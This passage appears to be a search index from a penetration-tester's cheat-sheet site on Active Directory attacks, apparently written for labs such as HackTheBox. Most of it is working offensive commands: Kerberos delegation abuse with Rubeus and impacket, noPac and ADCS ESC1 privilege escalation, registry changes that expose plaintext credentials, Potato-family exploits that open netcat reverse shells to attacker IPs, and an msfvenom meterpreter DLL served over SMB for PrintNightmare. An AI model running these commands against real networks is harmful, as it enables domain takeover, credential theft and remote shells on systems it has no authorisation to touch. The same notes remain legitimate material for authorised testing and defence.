192.168.146.175 resourced.local/rbcd:'Password123!'\n</code></pre> auth with ccache <pre><code>export KRB5CCNAME=Administrator@cifs_RESOURCEDC.resourced.local@RESOURCED.LOCAL.ccache\n</code></pre> PSEXEC IN <pre><code>impacket-psexec Administrator@resourced.local -k -no-pass -dc-ip 192.168.146.175\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Resource-Based%20Constrained%20Delegation/#windows","title":"Windows","text":"<p>Windows PowerMad has a cmdlet to let us create machine accounts: <pre><code>New-MachineAccount -MachineAccount baud -Password $(ConvertTo-SecureString 'Baudy16!1' -AsPlainText -Force)\n</code></pre> Configure rights (with default AD powershell module) <pre><code>Set-ADComputer its-dc1 -PrincipalsAllowedToDelegateToAccount baud$\n</code></pre> use rubeus <pre><code># get AES:\nRubeus.exe hash /password:Baudy16!1 /user:baud$ /domain:its-piemonte.local\n# get only RC4:\nRubeus.exe hash /password:Baudy16!1\n</code></pre></p> <pre><code>Rubeus.exe s4u /user:baud$ /rc4:8F8172E42D04C1934FECC9E8404E2657 /domain:its-piemonte.local /msdsspn:cifs/its-dc1 /impersonateuser:administrator /ptt\n</code></pre> <p>Convert to auth ticket <pre><code>impacket-ticketConverter rubeusTicket.kirbi impacketTicket.ccache\n</code></pre></p>","tags":["Authenticated","Elevated","Kerberos","msDS-AllowedToActOnBehalfOfOtherIdentity","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/SMB/","title":"SMB","text":"","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/SMB/#share-enumeration","title":"Share Enumeration","text":"<p><pre><code>nxc smb &lt;ip&gt; -u '' -p '' --shares\n</code></pre> <pre><code>nxc smb &lt;ip&gt; -u '' -p '' -M spider_plus --share 'sharename'\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -H &lt;ip&gt;\n</code></pre> <pre><code>smbmap -u &lt;user&gt; -p &lt;pass&gt; -d &lt;domain&gt; -H &lt;ip&gt; -R 'sharename' --dir-only\n</code></pre></p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Service%20for%20User%20to%20Self/","title":"Service for User to Self","text":"<p>Get local admin with machine accounts via s4u2self <pre><code>nxc smb 192.168.56.10 -u 'KINGSLANDING$' -H 220fc1990391bdc183d1a68c389c0229 --delegate Administrator --self\n</code></pre></p>","tags":["S4U2Proxy","S4U2Self","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Unconstrained%20Delegation/","title":"Unconstrained Delegation","text":"","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Unconstrained%20Delegation/#identify","title":"Identify","text":"<p>Linux - remote <pre><code>nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation\n</code></pre> Windows - local <pre><code>ADSearch.exe --search \"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" --attributes samaccountname,dnshostname\n</code></pre></p> <p>Domain Controllers are always permitted for unconstrained delegation.</p>","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Unconstrained%20Delegation/#exploit","title":"Exploit","text":"","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Lateral%20Movement/Unconstrained%20Delegation/#force-dc-to-auth-to-our-box-and-steal-tgt","title":"Force DC to auth to our box and steal tgt","text":"<p>Monitor for tickets with Rubeus <pre><code>Rubeus.exe monitor /interval:10 /nowrap\n</code></pre> Run https://github.com/cube0x0/SharpSystemTriggers to coerce authentication <pre><code>SharpSpoolTrigger.exe dc01.lab.local web.dev.lav.local\n</code></pre> Where:</p> <ul> <li>DC01 is the \"target\".</li> <li>WEB is the \"listener\". Rebeus should capture a ticket</li> </ul>","tags":["Authenticated","Elevated","Kerberos","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Disable%20Restricted%20Admin%20Mode/","title":"Disable Restricted Admin Mode","text":"<p>To RDP with a hash, you must enable restricted admin mode via registry <pre><code>reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f\n</code></pre></p>"},{"location":"%F0%9F%AA%9F%20Active%20Directory/Miscellaneous/Enable%20plaintext%20wdigest/","title":"Enable plaintext wdigest","text":"<p>run powershell with admin rights <pre><code>reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1\n</code></pre> <pre><code>gpupdate /force\n</code></pre> Reboot box</p>","tags":["AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/NoPac%20%28SamAccountName%20Spoofing%29/","title":"NoPac (SamAccountName Spoofing)","text":"<p>https://github.com/Ridter/noPac.git</p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/NoPac%20%28SamAccountName%20Spoofing%29/#identify","title":"Identify","text":"<p><pre><code>sudo python3 scanner.py domain.local/user:'password' -dc-ip &lt;DCIP&gt; -use-ldap\n</code></pre> nxc: <pre><code>nxc smb &lt;ip&gt; -u 'user' -p 'pass' -M nopac\n</code></pre></p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/NoPac%20%28SamAccountName%20Spoofing%29/#exploit","title":"Exploit","text":"<p><pre><code>sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip &lt;dcip&gt;  -dc-host DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <pre><code>sudo python3 noPac.py DOMAIN.LOCAL/user:'pass' -dc-ip &lt;dcip&gt;  -dc-host DC01 --impersonate administrator -use-ldap -dump -just-dc-user DOMAIN/administrator\n</code></pre></p> <p>OPSEC: will spawn a SYSTEM shell with smbsexec - shell may establish but defender will likely block further execution.</p>","tags":["Authenticated","Domain-Admin","Lateral-Movement","Local","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/","title":"Token Privileges","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/#identify","title":"identify","text":"<p><pre><code>whoami /priv\n</code></pre> Or sysinternals</p> <p>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk <pre><code>accesschk.exe -p\n</code></pre></p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/#exploit","title":"Exploit","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/#seimpersonate-seassignprimarytoken","title":"SeImpersonate &amp; SeAssignPrimaryToken","text":"<p>Windows Server 2016 and under:  JuicyPotato https://github.com/ohpe/juicy-potato <pre><code>JuicyPotato.exe -l 53375 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\tools\\nc.exe 10.10.15.119 5555 -e cmd.exe\" -t *\n</code></pre> Windows Server 2019 and on: PrintSpoofer: https://github.com/itm4n/PrintSpoofer Spawn shell over new process need stable shell <pre><code>PrintSpoofer.exe -i -c cmd.exe\n</code></pre> Spawn revshell <pre><code>PrintSpoofer.exe -c \"c:\\tools\\nc.exe 10.10.14.3 8443 -e cmd\"\n</code></pre> RoguePotato: https://github.com/antonioCoco/RoguePotato <pre><code>RoguePotato.exe -r &lt;IP&gt; -e \"C:\\Windows\\Tasks\\nc.exe &lt;IP&gt; &lt;port&gt; -e cmd.exe\" -l 9999\n</code></pre> SweetPotato: https://github.com/CCob/SweetPotato <pre><code>SweetPotato.exe -p C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -a \"-w hidden -enc &lt;ENCODED REVSHELL&gt;\"\n</code></pre> OR <pre><code>SweetPotato.exe -e EfsRpc -p c:\\Users\\Public\\nc.exe -a \"10.10.10.10 1234 -e cmd\"\n</code></pre> GodPotato: https://github.com/BeichenDream/GodPotato <pre><code>GodPotato.exe -cmd \"cmd /c whoami\"\n</code></pre> <pre><code>GodPotato -cmd \"nc -t -e C:\\Windows\\System32\\cmd.exe 192.168.1.102 2012\"\n</code></pre></p>","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/Token%20Privileges/#sedebug","title":"SeDebug","text":"","tags":["Local","Privilege-Escalation","SeAssignPrimaryPrivilege","SeBackupPrivilege","SeCreateTokenPrivilege","SeDebugPrivilege","SeImpersonatePrivilege","SeLoadDriverPrivilege","SeRestorePrivilege","SeTakeOwnershipPrivilege","SeTcbPrivilege","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/","title":"\u00a9\ufe0f ADCS","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/#identify","title":"Identify","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/#from-windows","title":"From Windows","text":"<p>Check if \u201cCert Publishers\u201d group exists (checks if ADCS is enabled) <pre><code>net localgroup \"Cert Publishers\"\n</code></pre> Use cerify.exe <pre><code>.\\Certify.exe find /vulnerable\n</code></pre> Powershell <pre><code>Get-ADObject -LDAPFilter '(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=Domain,DC=local'\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/#from-linux","title":"From Linux","text":"<p>NetExec <pre><code>nxc ldap &lt;IP&gt; -u \"user\" -p \"Password123!\" -M adcs\n</code></pre> ldap <pre><code>ldapsearch -x -D \"CN=svc-ldapuser,CN=Users,DC=certified,DC=htb\" -w 'SuperSecretPass' -b \"DC=certified,DC=htb\" \"(&amp;(objectClass=pKIEnrollmentService))\" -H ldap://10.129.229.25\n</code></pre> Certipy <pre><code>certipy-ad find -u 'user@domain.local' -p 'Password123!' -dc-ip &lt;IP&gt; -vulnerable -stdout\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/#exploit","title":"Exploit","text":"","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%C2%A9%EF%B8%8F%20ADCS/#esc1","title":"ESC1","text":"<p>If a template is vulnerable to ESC1, certipy can automatically exploit it. Request the Administrators certificate: <pre><code>certipy-ad req -u &lt;user&gt; -p &lt;password&gt; -dc-ip &lt;IP&gt; -template &lt;Template Name&gt; -upn Administrator@certified.htb -ca &lt;Certificate Authorities&gt; -target dc.domain.local\n</code></pre> Request TGS &amp; NTLM hash with certificate: <pre><code>certipy-ad auth -pfx administrator.pfx -dc-ip &lt;IP&gt;\n</code></pre> Or with NXC: <pre><code>nxc smb &lt;IP&gt; --pfx-cert administrator.pfx -u 'Administrator'\n</code></pre></p>","tags":["Authenticated","Certificate-Service","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%F0%9F%91%BB%20PrintNightmare/","title":"\ud83d\udc7b PrintNightmare","text":"<p>https://github.com/cube0x0/CVE-2021-1675</p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%F0%9F%91%BB%20PrintNightmare/#identify","title":"Identify","text":"<p><pre><code> rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n</code></pre> <pre><code>REG QUERY \"HKLM\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\"\nHKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\n    RestrictDriverInstallationToAdministrators    REG_DWORD    0x0\n    NoWarningNoElevationOnInstall    REG_DWORD    0x1\n</code></pre></p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]},{"location":"%F0%9F%AA%9F%20Active%20Directory/Privilege%20Escalation/%F0%9F%91%BB%20PrintNightmare/#exploit","title":"Exploit","text":"<p>You need bros version of impacket <pre><code>pip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n</code></pre> Generate DLL payload <pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST= LPORT=8080 -f dll &gt; timsync.dll\n</code></pre> Host payload on smbserver <pre><code>sudo smbserver.py -smb2support ITShare share\n</code></pre> Start listener, execute payload <pre><code>sudo python3 CVE-2021-1675.py domain.local/user:'password'@&lt;dcip&gt; '\\\\&lt;attackhost&gt;\\ITShare\\timesync.dll'\n</code></pre></p>","tags":["Domain-Admin","Initial-Access","Lateral-Movement","Privilege-Escalation","AD"]}]}